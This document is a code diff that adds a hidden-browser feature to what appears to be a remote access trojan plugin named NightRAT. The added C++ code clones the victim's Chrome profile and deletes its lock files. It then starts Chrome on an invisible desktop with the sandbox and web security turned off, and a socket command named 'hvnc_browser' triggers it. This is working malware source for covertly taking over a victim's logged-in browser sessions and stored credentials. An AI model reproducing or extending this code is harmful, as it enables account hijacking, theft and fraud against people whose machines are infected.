@@ -4,6 +4,9 @@
 #include <commctrl.h>
 #include <uxtheme.h>
 #include <dwmapi.h>
+#include <shlobj.h>
+#include <shellapi.h>
+#include <shlwapi.h>
 #include <propidl.h>
 #include <gdiplus.h>
 #include <objidl.h>
@@ -30,6 +33,8 @@
 #pragma comment(lib, "comctl32.lib")
 #pragma comment(lib, "uxtheme.lib")
 #pragma comment(lib, "dwmapi.lib")
+#pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "shlwapi.lib")
 
 using json = nlohmann::json;
 using namespace Gdiplus;
@@ -1134,6 +1139,204 @@ static wstring utf8_to_wstring(const string& str) {
     return res;
 }
 
+static bool copy_directory(const wstring& source, const wstring& destination) {
+    vector<wchar_t> from;
+    from.assign(source.begin(), source.end());
+    from.push_back(L'\\');
+    from.push_back(L'*');
+    from.push_back(L'\0');
+    from.push_back(L'\0');
+
+    vector<wchar_t> to;
+    to.assign(destination.begin(), destination.end());
+    to.push_back(L'\0');
+    to.push_back(L'\0');
+
+    SHFILEOPSTRUCTW fileOp = { 0 };
+    fileOp.wFunc = FO_COPY;
+    fileOp.pFrom = from.data();
+    fileOp.pTo = to.data();
+    fileOp.fFlags = FOF_NOCONFIRMATION | FOF_NOCONFIRMMKDIR | FOF_SILENT | FOF_NOERRORUI | 0x0400; // 0x0400 is FOF_CONTINUEONERROR
+
+    return SHFileOperationW(&fileOp) == 0;
+}
+
+static void delete_lock_files(const wstring& directory) {
+    wstring searchPath = directory + L"\\*";
+    WIN32_FIND_DATAW findData;
+    HANDLE hFind = FindFirstFileW(searchPath.c_str(), &findData);
+    if (hFind == INVALID_HANDLE_VALUE) return;
+
+    do {
+        if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0)
+            continue;
+
+        wstring fullPath = directory + L"\\" + findData.cFileName;
+        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+            delete_lock_files(fullPath);
+        } else {
+            if (wcsstr(findData.cFileName, L"SingletonLock") ||
+                wcsstr(findData.cFileName, L"Parent.lock") ||
+                wcsstr(findData.cFileName, L"lockfile")) {
+                DeleteFileW(fullPath.c_str());
+            }
+        }
+    } while (FindNextFileW(hFind, &findData));
+    FindClose(hFind);
+}
+
+static wstring get_chrome_path() {
+    wstring path;
+    HKEY hKey;
+    // 1. HKLM App Paths
+    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        WCHAR szPath[MAX_PATH];
+        DWORD cbData = sizeof(szPath);
+        if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)szPath, &cbData) == ERROR_SUCCESS) {
+            path = szPath;
+        }
+        RegCloseKey(hKey);
+    }
+    if (!path.empty() && PathFileExistsW(path.c_str())) return path;
+
+    // 2. HKCU App Paths
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        WCHAR szPath[MAX_PATH];
+        DWORD cbData = sizeof(szPath);
+        if (RegQueryValueExW(hKey, NULL, NULL, NULL, (LPBYTE)szPath, &cbData) == ERROR_SUCCESS) {
+            path = szPath;
+        }
+        RegCloseKey(hKey);
+    }
+    if (!path.empty() && PathFileExistsW(path.c_str())) return path;
+
+    // 3. Environment variables (W6432)
+    WCHAR programW6432[MAX_PATH];
+    if (GetEnvironmentVariableW(L"ProgramW6432", programW6432, MAX_PATH) > 0) {
+        path = wstring(programW6432) + L"\\Google\\Chrome\\Application\\chrome.exe";
+        if (PathFileExistsW(path.c_str())) return path;
+    }
+
+    // 4. Standard CSIDL locations
+    WCHAR buffer[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROGRAM_FILES, NULL, 0, buffer))) {
+        path = wstring(buffer) + L"\\Google\\Chrome\\Application\\chrome.exe";
+        if (PathFileExistsW(path.c_str())) return path;
+    }
+    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_PROGRAM_FILESX86, NULL, 0, buffer))) {
+        path = wstring(buffer) + L"\\Google\\Chrome\\Application\\chrome.exe";
+        if (PathFileExistsW(path.c_str())) return path;
+    }
+    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, buffer))) {
+        path = wstring(buffer) + L"\\Google\\Chrome\\Application\\chrome.exe";
+        if (PathFileExistsW(path.c_str())) return path;
+    }
+
+    return L"";
+}
+
+static void launch_browser_thread(string browserName) {
+    ensure_desktop();
+    if (!g_hHiddenDesktop) return;
+
+    WCHAR appData[MAX_PATH];
+    if (FAILED(SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appData))) {
+        send_error("Failed to get LOCAL_APPDATA path.");
+        return;
+    }
+
+    wstring sourceProfile;
+    wstring chromePath;
+    if (browserName == "chrome.exe") {
+        sourceProfile = wstring(appData) + L"\\Google\\Chrome\\User Data";
+        chromePath = get_chrome_path();
+    } else {
+        return;
+    }
+
+    if (chromePath.empty() || !PathFileExistsW(chromePath.c_str())) {
+        send_error("Browser executable (chrome.exe) not found in standard paths or registry.");
+        return;
+    }
+
+    WCHAR tempPath[MAX_PATH];
+    GetTempPathW(MAX_PATH, tempPath);
+    // Use a more unique folder name to avoid conflicts with previous sessions
+    wstring destProfile = wstring(tempPath) + L"NightRAT_Chrome_" + to_wstring((unsigned long long)GetTickCount64());
+
+    if (PathFileExistsW(sourceProfile.c_str())) {
+        send_status("Cloning profile (this may take a while)...");
+        if (!copy_directory(sourceProfile, destProfile)) {
+            send_status("Profile cloning partially failed (some files may be locked), but attempting to start anyway...");
+        }
+        delete_lock_files(destProfile);
+    } else {
+        send_status("Source profile not found. Starting with a fresh profile.");
+    }
+
+    // Comprehensive flags to ensure Chrome starts on a hidden desktop and avoids GPU-related crashes
+    wstring cmdLine = L"\"" + chromePath + L"\" "
+        L"--user-data-dir=\"" + destProfile + L"\" "
+        L"--no-sandbox "
+        L"--disable-gpu "
+        L"--disable-software-rasterizer "
+        L"--disable-dev-shm-usage "
+        L"--no-first-run "
+        L"--no-default-browser-check "
+        L"--disable-extensions "
+        L"--disable-features=RendererCodeIntegrity "
+        L"--disable-setuid-sandbox "
+        L"--allow-no-sandbox-job "
+        L"--disable-3d-apis "
+        L"--disable-notifications "
+        L"--disable-background-networking "
+        L"--disable-component-update "
+        L"--password-store=basic "
+        L"--disable-sync "
+        L"--metrics-recording-only "
+        L"--no-report-upload "
+        L"--disable-breakpad "
+        L"--disable-crash-reporter "
+        L"--disable-gpu-sandbox "
+        L"--disable-infobars "
+        L"--disable-session-crashed-bubble "
+        L"--disable-ipv6 "
+        L"--disable-prompt-on-repost "
+        L"--disable-sync-preferences "
+        L"--disable-translate "
+        L"--disable-web-security "
+        L"--no-sandbox "
+        L"--no-pings "
+        L"--no-proxy-server "
+        L"--remote-debugging-port=0";
+
+    vector<wchar_t> cmdLineBuf(cmdLine.begin(), cmdLine.end());
+    cmdLineBuf.push_back(L'\0');
+
+    wstring fullDesktopName = L"WinSta0\\" + g_desktopName;
+    STARTUPINFOW si = { sizeof(si) };
+    si.lpDesktop = (LPWSTR)fullDesktopName.c_str();
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_SHOW;
+
+    wstring chromeDir = chromePath;
+    size_t lastBackslash = chromeDir.find_last_of(L'\\');
+    if (lastBackslash != wstring::npos) {
+        chromeDir = chromeDir.substr(0, lastBackslash);
+    }
+
+    PROCESS_INFORMATION pi = { 0 };
+    // Using CREATE_NEW_CONSOLE to match hvnc_run behavior and providing a working directory
+    if (CreateProcessW(NULL, cmdLineBuf.data(), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, chromeDir.c_str(), &si, &pi)) {
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        g_forceFullFrame = true;
+        send_status("Chrome process successfully created on hidden desktop.");
+    } else {
+        send_error("Failed to create Chrome process. Error: " + to_string(GetLastError()));
+    }
+}
+
 extern "C" __declspec(dllexport) void RunPlugin(SOCKET sock) {
     initialize_visual_styles();
     g_socket = sock;
@@ -1218,6 +1421,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             } else {
                 send_error("Failed to start process. Error: " + to_string(GetLastError()));
             }
+        } else if (action == "hvnc_browser") {
+            string browser = cmd.value("browser", "chrome.exe");
+            thread(launch_browser_thread, browser).detach();
         } else if (action.find("hvnc_mouse") != string::npos ||
                    action.find("hvnc_key")   != string::npos ||
                    action == "hvnc_char" ||
